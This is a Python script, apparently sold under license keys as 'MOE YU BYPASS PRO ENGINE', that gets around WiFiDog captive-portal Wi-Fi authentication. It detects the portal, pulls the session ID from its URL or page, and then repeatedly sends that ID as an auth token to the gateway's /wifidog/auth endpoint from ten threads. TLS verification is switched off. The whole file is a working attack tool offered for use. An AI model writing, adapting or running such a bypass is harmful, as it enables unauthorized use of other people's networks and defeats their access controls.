import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 10
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# Color Codes
GREEN = "\033[92m"
RESET = "\033[0m"

URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def display_hacker_flag():
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))

def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except: sys.exit()
    
    try:
        res = requests.get(URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("\n[bold red]❌ HWID MISMATCH![/bold red]")
                    sys.exit()
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    console.print(f"\n[bold green]ACCESS_GRANTED! EXPIRY: {date_label}[/bold green]")
                    return True
        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE (REWRITTEN)
# ===============================
def start_bypass_process():
    while not stop_event.is_set():
        try:
            session = requests.Session()
            session.verify = False
            
            # Step 1: Detect Captive Portal
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
            if r.status_code == 204:
                time.sleep(10)
                continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            p = parse_qs(parsed_portal.query)

            # Step 2: Extract Session ID (sid)
            r2 = session.get(portal_url, timeout=10)
            sid = p.get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                # သင်ပြင်ခိုင်းလိုက်သော Link နေရာ (Incomplete Parameters error ကို ဖြေရှင်းရန်)
                auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}"
                
                console.print(f"[bold yellow][!] BYPASSING WITH SID: {sid[:15]}...[/bold yellow]")

                def pulse_ping():
                    while not stop_event.is_set():
                        try:
                            # Server ကို bypass request ပို့ခြင်း
                            session.get(auth_link, timeout=7)
                            sys.stdout.write(f"{GREEN}[✓] AUTH SENT | SESSION ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.5) # Cloud server နှေးနေလျှင် အချိန်နည်းနည်းပိုပေးပါ

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, daemon=True).start()
                
                # Connection Status Check
                while True:
                    try:
                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(15)
                        else: break
                    except: break
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
